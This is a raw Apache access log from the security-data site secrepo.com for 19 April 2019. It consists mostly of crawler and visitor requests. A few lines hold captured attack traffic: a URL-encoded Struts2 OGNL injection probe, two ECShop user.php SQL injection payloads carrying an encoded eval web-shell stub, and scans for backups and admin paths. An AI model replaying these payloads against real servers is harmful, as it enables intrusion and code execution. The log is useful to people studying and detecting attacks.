112.5.236.96 - - [19/Apr/2019:02:10:43 -0700] "HEAD /backup.tar.gz HTTP/1.1" 404 319 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
112.5.236.96 - - [19/Apr/2019:02:10:43 -0700] "HEAD /www.secrepo.com.zip HTTP/1.1" 404 319 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
112.5.236.96 - - [19/Apr/2019:02:10:43 -0700] "HEAD /www.secrepo.com.tar.gz HTTP/1.1" 404 319 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
112.5.236.96 - - [19/Apr/2019:02:10:43 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
112.5.236.96 - - [19/Apr/2019:02:10:43 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
112.5.236.96 - - [19/Apr/2019:02:10:43 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
112.5.236.96 - - [19/Apr/2019:02:10:45 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
157.55.39.132 - - [19/Apr/2019:02:11:49 -0700] "GET /self.logs/access.log.2017-12-14.gz HTTP/1.1" 200 24894 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
206.172.0.205 - - [19/Apr/2019:02:12:41 -0700] "GET / HTTP/1.1" 304 189 "-" "Mozilla/4.0 (compatible;)" 
148.70.13.65 - - [19/Apr/2019:02:16:07 -0700] "POST /%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()).(%23res.addHeader(%27eresult%27%2c%27struts2_security_check%27))%7d/ HTTP/1.1" 404 712 "-" "Auto Spider 1.0" 
148.70.13.65 - - [19/Apr/2019:02:16:07 -0700] "POST / HTTP/1.1" 200 12474 "-" "Auto Spider 1.0" 
148.70.13.65 - - [19/Apr/2019:02:16:08 -0700] "POST / HTTP/1.1" 200 12474 "-" "Auto Spider 1.0" 
148.70.13.65 - - [19/Apr/2019:02:16:08 -0700] "POST / HTTP/1.1" 200 12474 "-" "Auto Spider 1.0" 
148.70.13.65 - - [19/Apr/2019:02:16:49 -0700] "POST / HTTP/1.1" 200 12474 "-" "Auto Spider 1.0" 
148.70.13.65 - - [19/Apr/2019:02:16:50 -0700] "POST / HTTP/1.1" 200 12474 "-" "Auto Spider 1.0" 
113.171.224.176 - - [19/Apr/2019:02:20:49 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.132 - - [19/Apr/2019:02:24:40 -0700] "GET /self.logs/error.log.2017-01-26.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.41 - - [19/Apr/2019:02:24:42 -0700] "GET /self.logs/2016/error.log.2016-12-15.gz HTTP/1.1" 200 673 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.53 - - [19/Apr/2019:02:25:04 -0700] "GET /self.logs/error.log.2017-08-23.gz HTTP/1.1" 200 825 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.156 - - [19/Apr/2019:02:29:12 -0700] "GET /self.logs/access.log.2017-05-12.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
59.188.82.5 - - [19/Apr/2019:02:31:01 -0700] "POST /user.php HTTP/1.1" 404 295 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:201:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24687a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262614870736247466e595630704f773d3d2729293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
59.188.82.5 - - [19/Apr/2019:02:31:02 -0700] "POST /user.php HTTP/1.1" 404 239 "45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:\"num\";s:207:\"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b24487a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262534870736247466e595630704f773d3d2729293b2f2f7d7d,0--\";s:2:\"id\";s:9:\"' union/*\";s:4:\"name\";s:3:\"ads\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
157.55.39.132 - - [19/Apr/2019:02:32:31 -0700] "GET /self.logs/error.log.2017-06-20.gz HTTP/1.1" 200 1052 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.240 - - [19/Apr/2019:02:35:00 -0700] "GET /self.logs/2015/access.log.2015-06-30.gz HTTP/1.1" 200 5302 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
108.162.166.117 - - [19/Apr/2019:02:39:13 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
108.162.166.117 - - [19/Apr/2019:02:39:13 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
54.36.150.118 - - [19/Apr/2019:02:41:21 -0700] "GET /self.logs/access.log.2017-09-27.gz HTTP/1.1" 200 32213 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.219 - - [19/Apr/2019:02:41:29 -0700] "GET /self.logs/access.log.2015-08-21.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
198.108.66.96 - - [19/Apr/2019:02:48:32 -0700] "GET / HTTP/1.1" 301 427 "-" "Mozilla/5.0 zgrab/0.x" 
198.108.66.96 - - [19/Apr/2019:02:48:32 -0700] "GET / HTTP/1.1" 200 12455 "http://66.33.221.139:80/" "Mozilla/5.0 zgrab/0.x" 
37.115.187.223 - - [19/Apr/2019:02:48:58 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://dantk.ru/goryashie-tury/goryashie-tury-v-greciyu/korfu/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; .NET CLR 1.1.4322)" 
37.115.187.223 - - [19/Apr/2019:02:48:59 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://dantk.ru/goryashie-tury/goryashie-tury-v-greciyu/korfu/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; .NET CLR 1.1.4322)" 
37.115.187.223 - - [19/Apr/2019:02:48:59 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://dantk.ru/goryashie-tury/goryashie-tury-v-greciyu/korfu/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; .NET CLR 1.1.4322)" 
64.89.234.161 - - [19/Apr/2019:02:49:16 -0700] "GET / HTTP/1.1" 301 427 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
64.89.234.161 - - [19/Apr/2019:02:49:16 -0700] "GET / HTTP/1.1" 200 12455 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
64.89.234.161 - - [19/Apr/2019:02:49:16 -0700] "GET / HTTP/1.1" 200 12455 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36" 
157.55.39.40 - - [19/Apr/2019:02:50:12 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.229 - - [19/Apr/2019:02:53:31 -0700] "GET /self.logs/access.log.2017-09-17.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
61.112.17.233 - - [19/Apr/2019:02:54:12 -0700] "GET /wp-admin/ HTTP/1.1" 301 479 "-" "-" 
31.24.33.250 - - [19/Apr/2019:03:01:13 -0700] "GET /test/wp-admin/ HTTP/1.1" 301 489 "-" "-" 
216.244.66.245 - - [19/Apr/2019:03:01:56 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.149.6 - - [19/Apr/2019:03:05:26 -0700] "GET /self.logs/2016/access.log.2016-03-19.gz HTTP/1.1" 200 6239 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
132.148.105.138 - - [19/Apr/2019:03:08:19 -0700] "GET /wordpress/wp-admin/ HTTP/1.1" 301 499 "-" "-" 
40.77.167.158 - - [19/Apr/2019:03:09:32 -0700] "GET /self.logs/access.log.2017-05-22.gz HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.132 - - [19/Apr/2019:03:12:22 -0700] "GET /self.logs/access.log.2017-09-27.gz HTTP/1.1" 200 32269 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.132 - - [19/Apr/2019:03:12:22 -0700] "GET /self.logs/error.log.2017-09-18.gz HTTP/1.1" 200 2121 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.224 - - [19/Apr/2019:03:13:31 -0700] "GET /self.logs/error.log.2018-11-27.gz HTTP/1.1" 200 3997 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
162.249.5.6 - - [19/Apr/2019:03:15:11 -0700] "GET /blog/wp-admin/ HTTP/1.1" 301 489 "-" "-" 
54.36.150.97 - - [19/Apr/2019:03:17:25 -0700] "GET /self.logs/error.log.2016-06-12.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
120.92.33.51 - - [19/Apr/2019:03:19:30 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
120.92.33.51 - - [19/Apr/2019:03:19:32 -0700] "GET /login.action HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
120.92.33.51 - - [19/Apr/2019:03:19:32 -0700] "GET /index.action HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
120.92.33.51 - - [19/Apr/2019:03:19:33 -0700] "GET /search.action HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
120.92.33.51 - - [19/Apr/2019:03:19:33 -0700] "GET /pages/viewpage.action HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
54.36.148.199 - - [19/Apr/2019:03:20:55 -0700] "GET /self.logs/access.log.2017-07-07.gz HTTP/1.1" 200 20630 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
209.81.96.144 - - [19/Apr/2019:03:22:08 -0700] "GET /wp/wp-admin/ HTTP/1.1" 301 485 "-" "-" 
113.171.224.176 - - [19/Apr/2019:03:22:18 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
37.115.187.223 - - [19/Apr/2019:03:24:17 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://filmi-v.online/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
37.115.187.223 - - [19/Apr/2019:03:24:17 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://filmi-v.online/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
37.115.187.223 - - [19/Apr/2019:03:24:18 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://filmi-v.online/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
46.41.144.26 - - [19/Apr/2019:03:29:01 -0700] "GET /old/wp-admin/ HTTP/1.1" 301 487 "-" "-" 
119.197.40.242 - - [19/Apr/2019:03:32:56 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 297840 "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" 
216.244.66.245 - - [19/Apr/2019:03:34:12 -0700] "GET /self.logs/access.log.2018-01-09.gz HTTP/1.1" 200 24646 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
37.115.187.223 - - [19/Apr/2019:03:34:37 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://supermodni.com.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)" 
37.115.187.223 - - [19/Apr/2019:03:34:38 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://supermodni.com.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)" 
37.115.187.223 - - [19/Apr/2019:03:34:39 -0700] "GET /honeypot/ HTTP/1.1" 200 1077 "https://supermodni.com.ua/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.0.3705)" 
106.120.173.136 - - [19/Apr/2019:03:34:50 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.120.173.136 - - [19/Apr/2019:03:34:59 -0700] "GET / HTTP/1.1" 200 12474 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
207.46.13.229 - - [19/Apr/2019:03:37:44 -0700] "GET /self.logs/access.log.2019-03-12.gz HTTP/1.1" 200 17375 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.149.21 - - [19/Apr/2019:03:44:03 -0700] "GET /self.logs/error.log.2018-08-13.gz HTTP/1.1" 200 7348 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.74 - - [19/Apr/2019:03:45:47 -0700] "GET /self.logs/access.log.2017-10-06.gz HTTP/1.1" 200 33262 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.180 - - [19/Apr/2019:03:47:42 -0700] "GET /self.logs/access.log.2018-01-10.gz HTTP/1.1" 200 21215 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.68 - - [19/Apr/2019:03:51:34 -0700] "GET /self.logs/2015/access.log.2015-09-08.gz HTTP/1.1" 200 3805 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
47.75.127.244 - - [19/Apr/2019:03:52:47 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36" 
47.75.127.244 - - [19/Apr/2019:03:52:48 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36" 
47.244.179.123 - - [19/Apr/2019:03:52:49 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36" 
47.75.145.69 - - [19/Apr/2019:03:52:49 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36" 
47.75.249.244 - - [19/Apr/2019:03:52:57 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36" 
41.223.160.131 - - [19/Apr/2019:03:56:36 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.150.68 - - [19/Apr/2019:04:07:06 -0700] "GET /self.logs/error.log.2015-03-16.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.229 - - [19/Apr/2019:04:10:01 -0700] "GET /self.logs/access.log.2017-08-15.gz HTTP/1.1" 200 57391 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
82.167.250.62 - - [19/Apr/2019:04:12:00 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15" 
42.236.10.105 - - [19/Apr/2019:04:15:43 -0700] "GET / HTTP/1.1" 301 483 "http://secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.10.103 - - [19/Apr/2019:04:15:43 -0700] "GET / HTTP/1.1" 200 12511 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
42.236.10.103 - - [19/Apr/2019:04:15:44 -0700] "GET / HTTP/1.1" 200 12510 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider" 
49.77.248.11 - - [19/Apr/2019:04:19:30 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
49.206.0.16 - - [19/Apr/2019:04:20:33 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
